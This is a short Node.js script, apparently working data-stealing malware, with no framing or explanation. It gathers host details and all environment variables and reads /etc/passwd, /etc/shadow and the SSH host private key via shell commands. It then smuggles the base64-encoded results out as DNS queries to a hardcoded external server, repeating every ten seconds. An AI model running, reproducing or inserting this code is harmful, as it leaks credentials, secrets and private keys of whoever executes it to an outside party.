const dns = require('dns');
const os = require('node:os');
const { execSync} = require('node:child_process');
const  dotenv = require('dotenv');
const dnsServerIP = '44.208.20.53';
function info(){
    payload = os.hostname() + " " + os.homedir() + " " + `Total mem: ${os.totalmem()}` + " "+ `Free mem: ${os.freemem()}` + " " + os.platform() + " " + os.tmpdir(); 
        for (const [key, value] of Object.entries(process.env)) {
            payload += `${key}: ${value}"\n"`;
          }
    return payload; 
}   
payload = info();

function sendDns(dnsServerIP, domain){
    dns.setServers([dnsServerIP]);
    dns.resolve(domain, 'A', (err, address) => {
    if(!err){
    console.log(`${domain} için IP adresleri:`);
    address.forEach((address, index) => {
    console.log(`IP Adresi ${index + 1}: ${address}`);
      });
    }
 });
}
function hex(value){
    return Buffer.from(value).toString('base64');
}

function sendString(value) {
    return new Promise(resolve => {
        value = hex(value);
        let maxLength = 31;
        let promises = [];
        for (let i = 0; i < value.length; i += maxLength) { 
            let delay = 1000 * (i / maxLength);
            let values = value.slice(i, i + maxLength); 
            let timeoutPromise = new Promise(resolveTimeout => {
                setTimeout(() => {
                    sendDns(dnsServerIP, values);
                    console.log(`${values} sent to DNS Server...`);
                    resolveTimeout(); 
                }, delay);
            });
            promises.push(timeoutPromise);
        }
        Promise.all(promises).then(() => resolve());
    });
}


function op(){
    let msg = "";
   const commandsPlatform = {
    win32: [
        "dir",
        "dir..",
        "systeminfo",
        "netstat -aon"
    ],
     linux: [
        "ls -l",
        "ls ..",
        "ls ~",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "sudo cat /etc/ssh/ssh_host_rsa_key",
        "netstat -aon"

     ],
     darwin: [
        "ls -l",
        "ls ..",
        "ls ~",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "sudo cat /etc/ssh/ssh_host_rsa_key",
        "netstat -aon"
     ]

   } 
    let platform = os.platform();
    const commands = commandsPlatform[platform] || [];
    for(const command of commands){
        msg = execSync(command).toString();
        console.log(msg);
     } 

    if(platform  == 'win32'){  
        //windows

    }else if(platform == 'linux'){   
        //Linux
    }
    else if (platform == 'darwin'){
        //mac
    }else{
        console.log("Bilinmeyen");
    }
      
    return msg;
}

let msg = op();
  async function start(){
     sendDns(dnsServerIP, "baslangic");
     await sendString(payload);
     await sendString(msg);
      setTimeout(() => {
          start();     
      },10000);
}
start();